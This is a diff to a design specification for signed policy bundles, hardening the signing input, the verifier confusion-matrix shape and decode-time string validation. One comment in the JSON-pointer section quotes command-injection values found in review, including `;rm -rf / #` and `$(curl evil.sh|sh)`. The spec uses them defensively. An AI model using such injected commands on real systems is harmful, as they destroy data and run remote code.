@@ -3270,8 +3270,48 @@ section-name = "verify" / "route" / "memory" / "cortex" / "gates" / "agent_maps"
 
 signature = {
     key_id:  tstr,                     ; "ed25519:" + hex(sha256(pub)[..8])
-    sig:     bstr .size 64,            ; over: canonical-CBOR(section) || tenant_id || channel || seq
+    sig:     bstr .size 64,            ; over the D-Q signing structure below — NOT a bare concatenation
 }
+
+; DECISION D-Q (lead, binding). The signing input was
+; `canonical-CBOR(section) || tenant_id || channel || seq`. That form has three
+; defects, all found by adversarial review before any bundle was ever published:
+;
+;   1. SPLICE AMBIGUITY. Two variable-length fields (the section bytes and
+;      `channel`) are concatenated with no length prefixes and no domain
+;      separation, so the byte string does not uniquely determine its parse.
+;   2. IT DOES NOT COVER THE ENVELOPE. `issued_at`, `max_age`, `prev_hash` and
+;      `schema` are signed by nothing. Backdating the unsigned `issued_at`
+;      revives a ROTATED-OUT key without re-signing (the edge decides key
+;      validity by comparing key windows against that field), and an attacker
+;      who can set `max_age` sets the fail-static floor itself.
+;   3. IT DOES NOT COVER THE SECTION NAME, so one key published into all six
+;      rings makes 05 §4.5's section-split a configuration property with zero
+;      code enforcement — a `route` signature replays as a `verify` signature.
+;
+; The signing input is therefore a DOMAIN-SEPARATED CANONICAL-CBOR STRUCTURE,
+; matching the receipt plane's discipline (`mark1-label-v1\0`) rather than
+; inventing a second one. Canonical CBOR is self-delimiting, so ambiguity is
+; closed by construction instead of by careful field ordering:
+;
+;   signing_input = h'6d61726b312d62756e646c652d763100' ... i.e.
+;                   b"mark1-bundle-v1\0" || canonical-CBOR(bundle-sig-input)
+;
+;   bundle-sig-input = {
+;       schema:       tstr,        ; the envelope's own `schema`
+;       section_name: section-name,
+;       tenant_id:    bstr .size 16,
+;       channel:      tstr,
+;       seq:          uint,
+;       issued_at:    time,
+;       max_age:      uint,
+;       prev_hash:    bstr .size 32,
+;       section:      bstr,        ; canonical-CBOR bytes of THAT section, as a bstr
+;   }
+;
+; `inclusion` is the one envelope field excluded, for the same reason it is
+; excluded from `body_sha256`: a transparency-log leaf cannot commit to the
+; proof of its own inclusion.
 
 sections = {
     verify:     verify-section,
@@ -3302,13 +3342,31 @@ verifier-id = tstr .regexp "[a-z0-9_.@-]{1,128}"
 
 verifier-model = {
     verifier_id: verifier-id,
-    confusion:   confusion4x4,          ; row = true verdict, col = voted verdict, verdict order fixed
-    abstention:  abstention-model,      ; P(abstain | true verdict) — fusion treats silence as information, not as noise
+    confusion:   confusion4x3,          ; row = true verdict (order fixed), col = OBSERVED SIGNAL
 }
 
 posterior4   = [satisfied: float, violated: float, refused: float, error: float]
-confusion4x4 = [posterior4, posterior4, posterior4, posterior4]
-abstention-model = { p_abstain: posterior4 }
+signal3      = [accept: float, reject: float, abstain: float]
+confusion4x3 = [signal3, signal3, signal3, signal3]
+
+; DECISION D-R (lead, binding). This was `confusion4x4` (verdict×verdict) plus a
+; separate `abstention-model`, which contradicted 06 §3.1's `confusion[v]: 4x3`
+; over {accept, reject, abstain} — and the two halves of the estate implemented
+; the two different shapes. 06 wins, because it is the shape the algorithm that
+; actually runs consumes: Paper II's ADJUDICATE takes `NormalizedVote =
+; accept | reject | abstain`, and NO verifier in this system emits a verdict —
+; anchors emit signals and judges are normalized to signals before fusion. A
+; 4x4 verdict×verdict matrix parameterises an observation model nothing produces.
+; The separate `abstention` model is DELETED rather than kept: P(abstain | t) is
+; exactly the third column, and specifying one quantity in two places is how the
+; Rust and Python halves diverged in the first place.
+;
+; NORMATIVE, and enforced at decode: every `signal3` row MUST sum to 1.0 within
+; float tolerance, and `priors` (a `posterior4`) MUST sum to 1.0. A per-entry
+; [0,1] range check is NOT sufficient — an all-zero `priors` passes a range check
+; and then makes the Python twin's softmax raise "zero posterior mass", i.e. a
+; validly-signed bundle that detonates fusion at runtime. A row that is not a
+; distribution is a compiler bug, and it dies at decode (`M1E-3001`).
 
 correlation-group = {
     group_id: tstr,
@@ -3370,14 +3428,22 @@ agent-map = {
     tailer_rules:  { * tstr => json-pointer },       ; transcript field extraction, incl. the (message.id, requestId) dedupe pair
 }
 m1p-field    = tstr .regexp "[a-z0-9_.]{1,64}"
-json-pointer = tstr .regexp "(/[^/~]*(~[01][^/~]*)*)*"   ; RFC 6901 — a POINTER into vendor JSON, structurally incapable of naming a command
+json-pointer = tstr .size (0..1024) .regexp "(/[^/~]*(~[01][^/~]*)*)*"   ; RFC 6901 — a POINTER into vendor JSON, structurally incapable of naming a command
+; The .size bound is not decoration. RFC 6901's grammar admits ANY byte except an
+; unescaped '~' — review confirmed that a signed bundle accepted pointer values
+; containing `;rm -rf / #`, `$(curl evil.sh|sh)`, embedded newlines and tabs, and
+; a 4001-character pointer. All are doc-conformant, which is the point: pointers
+; are the ONE production in this schema whose contents are not otherwise
+; constrained, so "structurally incapable of naming a command" rests on the
+; CONSUMER treating them as pointers. The length bound is the part decode can
+; enforce; every consumer must resolve them as RFC 6901 pointers and never as text.
 ```
 
 `agent_maps` exists so a vendor changing its hook payload or transcript shape is **a bundle push, not a release**: the shim and tailers evaluate field maps as data, and the pinned `agent_version` plus conformance fixtures make a bad map a canary failure rather than a fleet outage.
 
 **The decode-time rejection rule (normative, enforced in `mark1-policy` and the Go twin):**
 
-1. **No command strings and no code anywhere in a bundle.** There is no field in this schema whose value is executed, evaluated, templated into a shell, or loaded as a module — and the decoder enforces that *structurally*, not by scanning: every `tstr` is either (a) a constrained identifier (`catalog_id`, `verifier_id`, `m1p-field` — regex-bounded, no whitespace, no `/` except JSON pointers), (b) an RFC 6901 JSON pointer, or (c) a closed enum. Any string failing its production's constraint **fails decode of the whole bundle** — there is no partial acceptance, because a half-applied bundle is an untested policy.
+1. **No command strings and no code anywhere in a bundle.** There is no field in this schema whose value is executed, evaluated, templated into a shell, or loaded as a module — and the decoder enforces that *structurally*, not by scanning: every `tstr` is either (a) a constrained identifier (`catalog_id`, `verifier_id`, `m1p-field` — regex-bounded, no whitespace, no `/` except JSON pointers), (b) an RFC 6901 JSON pointer, (c) a closed enum, or (d) — for the fields this CDDL writes as a bare `tstr` (`channel`, `agent_id`, `agent_version`, `model_id`, `task_class`, `ladder_id`, `facet`, `group_id`, and the key positions of `thresholds` and `tailer_rules`) — the fallback identifier production `[A-Za-z0-9_.:@-]{1,128}`. Clause (d) is what makes this rule's "every `tstr`" literally true rather than aspirational: a bare `tstr` in the grammar above is shorthand for that production, never for arbitrary text, and the decoder applies it. A violation is `M1E-3005`, the same code as an explicit command string, because an unconstrained string field is exactly how one would arrive. Any string failing its production's constraint **fails decode of the whole bundle** — there is no partial acceptance, because a half-applied bundle is an untested policy.
 2. Anchors are enabled by **local-catalog ID only**. The catalog lives on the device, is user-consented, and is re-consented on change; a bundle can turn a consented anchor on or off and tune thresholds — it cannot introduce, rename, or define one.
 3. **Strict maps everywhere:** an unknown key in any section fails decode. Forward compatibility is a new `policy_bundle.v2`, never a tolerated stray key — tolerated strays are how command fields sneak in later.
 4. **No `wasm_module` field exists**, in this schema or any section of it. The bundle→RCE branch is deleted from the design, not mitigated; a v2 that wanted executable policy would be a new ADR-level decision with its own signing regime, not a field addition.
